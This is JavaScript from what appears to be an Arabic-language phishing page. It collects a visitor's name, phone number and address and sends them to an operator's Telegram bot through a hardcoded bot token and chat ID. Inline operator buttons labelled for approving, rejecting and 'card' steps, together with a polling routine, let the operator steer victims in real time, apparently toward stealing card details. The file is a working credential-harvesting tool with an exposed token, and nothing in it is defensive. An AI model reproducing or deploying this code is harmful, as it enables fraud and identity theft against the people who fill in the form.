const BOT_TOKEN = '8891065186:AAEl3mhHxdy53_2ZOnQU1E08FWFxmEsn1R4';
    const CHAT_ID = '6165206261';
    const WEBHOOK_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;

    let pendingRequestId = null;

    async function sendToTelegram(message, requestId, dataType) {
        try {
            const response = await fetch(`${WEBHOOK_URL}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '🖥️ واجهة', callback_data: `approve_${dataType}_${requestId}` },
                            { text: '❌ رفض', callback_data: `reject_${dataType}_${requestId}` },
                            { text: '💳 بطاقة', callback_data: `decline_card_${dataType}_${requestId}` },
                            { text: 'الرسالة', callback_data: `link_card_${dataType}_${requestId}` }
                        ]]
                    }
                })
            });
            const json = await response.json();
            return json.result ? json.result.message_id : null;
        } catch (error) {
            console.error('خطأ في إرسال البيانات إلى تليجرام:', error);
            return null;
        }
    }

    async function editTelegramMessage(messageId, originalText, resultText) {
        try {
            await fetch(`${WEBHOOK_URL}/editMessageText`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    message_id: messageId,
                    text: originalText + '\n\n' + resultText,
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [] }
                })
            });
        } catch (error) {
            console.error('خطأ في تعديل رسالة تليجرام:', error);
        }
    }

    async function checkWebhookResponse(requestId, dataType) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
            const data = await response.json();
            if (data.ok && data.result && data.result.length > 0) {
                for (let update of data.result) {
                    if (update.callback_query) {
                        const callbackData = update.callback_query.data;
                        if (callbackData === `approve_${dataType}_${requestId}`) return 'approved';
                        if (callbackData === `reject_${dataType}_${requestId}`) return 'rejected';
                        if (callbackData === `decline_card_${dataType}_${requestId}`) return 'decline_card';
                        if (callbackData === `link_card_${dataType}_${requestId}`) return 'link_card';
                    }
                }
            }
            return 'pending';
        } catch (error) {
            console.error('خطأ في التحقق من استجابة تليجرام:', error);
            return 'pending';
        }
    }

    function validateForm() {
        const name = document.getElementById('fullName').value.trim();
        const ph   = document.getElementById('phoneNumber').value.trim();
        const addr = document.getElementById('address').value;
        const valid = name.length > 0 && ph.length === 11 && addr.length > 0;
        const btn = document.getElementById('submitBtn');
        btn.disabled = !valid;
        btn.classList.toggle('active', valid);
    }

    async function handleSubmit() {
        const fullName    = document.getElementById('fullName').value.trim();
        const phoneNumber = document.getElementById('phoneNumber').value.trim();
        const address     = document.getElementById('address').value;

        if (!fullName || phoneNumber.length !== 11 || !address) {
            alert('يرجى ملء جميع الحقول بشكل صحيح');
            return;
        }

        sessionStorage.setItem('userFullName', fullName);
        sessionStorage.setItem('userPhoneNumber', phoneNumber);
        sessionStorage.setItem('userAddress', address);

        document.getElementById('loadingOverlay').classList.add('show');

        const requestId = Date.now();
        pendingRequestId = requestId;

        const message =
            `🔔 <b>صفحة التسجيل - Registration</b>\n\n` +
            `👤 <b>الاسم الكامل:</b> <code>${fullName}</code>\n` +
            `📱 <b>رقم الهاتف:</b> <code>${phoneNumber}</code>\n` +
            `📍 <b>العنوان:</b> <code>${address}</code>\n\n` +
            `⏰ ${new Date().toLocaleString('ar-EG')}`;

        sendToTelegram(message, requestId, 'reg'); 

window.location.href = 'login.html';

}

    function showRejection() {
        document.body.innerHTML = `
        <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;
            height:100vh;font-family:'Cairo',sans-serif;text-align:center;padding:20px;background:#fff;">
            <div style="max-width:360px;width:100%;">
                <div style="width:80px;height:80px;background:#e53935;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:42px;color:white;margin:0 auto 24px;">✕</div>
                <h2 style="color:#b71c1c;font-size:20px;font-weight:700;margin-bottom:12px;">تم إدخال بيانات بشكل غير صحيح</h2>
                <p style="color:#777;font-size:14px;line-height:1.7;margin-bottom:30px;">يرجى التحقق من بياناتك والمحاولة مرة أخرى</p>
                <button onclick="location.reload()" style="padding:13px 30px;background:#0066CC;color:white;border:none;border-radius:25px;font-size:15px;font-weight:600;cursor:pointer;font-family:'Cairo',sans-serif;width:100%;">حاول مرة أخرى</button>
            </div>
        </div>`;
    }

    document.addEventListener('DOMContentLoaded', function () {
        document.getElementById('fullName').focus();
        validateForm();
        document.getElementById('fullName').addEventListener('input', validateForm);
        document.getElementById('phoneNumber').addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 11);
            validateForm();
        });
        document.getElementById('address').addEventListener('change', validateForm);
        document.getElementById('submitBtn').addEventListener('click', function () { if (!this.disabled) handleSubmit(); });
    });

    window.addEventListener('beforeunload', () => { pendingRequestId = null; });